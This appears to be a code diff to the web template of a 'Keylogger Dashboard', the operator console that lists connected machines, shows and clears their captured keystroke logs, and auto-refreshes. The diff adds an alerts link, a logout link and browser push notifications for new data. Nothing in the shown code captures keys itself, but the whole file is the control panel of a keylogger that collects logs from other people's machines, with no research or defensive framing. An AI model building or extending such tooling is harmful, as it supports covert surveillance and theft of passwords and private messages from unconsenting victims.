@@ -10,6 +10,11 @@
   h1 { color: #00ff88; font-size: 20px; margin-bottom: 8px; }
   .sub { color: #666; font-size: 13px; margin-bottom: 32px; }
   .empty { color: #444; font-size: 14px; margin-top: 40px; }
+  .topbar { display: flex; align-items: center; gap: 16px; margin-bottom: 8px; flex-wrap: wrap; }
+  .alerts-link { color: #ff4444; text-decoration: none; font-size: 13px; }
+  .alerts-link:hover { color: #ff6666; }
+  .logout { color: #444; text-decoration: none; font-size: 13px; margin-left: auto; }
+  .logout:hover { color: #888; }
   table { width: 100%; border-collapse: collapse; font-size: 14px; }
   th { text-align: left; padding: 10px 14px; color: #888; border-bottom: 1px solid #222; font-weight: normal; }
   td { padding: 12px 14px; border-bottom: 1px solid #1a1a1a; vertical-align: middle; }
@@ -23,14 +28,22 @@
   .btn-view:hover { background: #234d38; }
   .btn-clear { background: #2a1a1a; color: #ff4444; border: 1px solid #ff444433; margin-left: 8px; }
   .btn-clear:hover { background: #3d1f1f; }
+  .btn-notif { background: #1a2a3a; color: #4af; border: 1px solid #4af3; margin-top: 24px; }
   .dot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88;
          display: inline-block; margin-right: 8px; animation: pulse 2s infinite; }
   @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
 </style>
 </head>
 <body>
-  <h1>&#9656; Keylogger Dashboard</h1>
+  <div class="topbar">
+    <h1>&#9656; Keylogger Dashboard</h1>
+    <a class="alerts-link" href="/alerts">
+      &#9888; Alerts {% if alert_count > 0 %}({{ alert_count }}){% endif %}
+    </a>
+    <a class="logout" href="/logout">Logout</a>
+  </div>
   <p class="sub">Receiving logs from connected machines</p>
+
   {% if machines %}
   <table>
     <thead>
@@ -58,12 +71,47 @@
   {% else %}
   <p class="empty">No machines connected yet. Waiting for data...</p>
   {% endif %}
+
+  <br>
+  <button class="btn btn-notif" onclick="enableNotifications()">
+    🔔 Enable Notifications
+  </button>
+
 <script>
+const PUBLIC_KEY = "YOUR_VAPID_PUBLIC_KEY"; // replace with your key
+
+function urlBase64ToUint8Array(b) {
+  const pad = '='.repeat((4 - b.length % 4) % 4);
+  const base64 = (b + pad).replace(/-/g, '+').replace(/_/g, '/');
+  const raw = window.atob(base64);
+  return Uint8Array.from([...raw].map(c => c.charCodeAt(0)));
+}
+
+async function enableNotifications() {
+  if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
+    alert('Push notifications not supported in this browser.');
+    return;
+  }
+  const perm = await Notification.requestPermission();
+  if (perm !== 'granted') { alert('Permission denied'); return; }
+  const reg = await navigator.serviceWorker.register('/sw.js');
+  const sub = await reg.pushManager.subscribe({
+    userVisibleOnly: true,
+    applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY)
+  });
+  await fetch('/subscribe', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(sub)
+  });
+  alert('Notifications enabled!');
+}
+
 function clearLog(host) {
   if (!confirm('Clear log for ' + host + '?')) return;
-  fetch('/clear/' + host, { method: 'POST' })
-    .then(() => location.reload());
+  fetch('/clear/' + host, { method: 'POST' }).then(() => location.reload());
 }
+
 setTimeout(() => location.reload(), 30000);
 </script>
 </body>
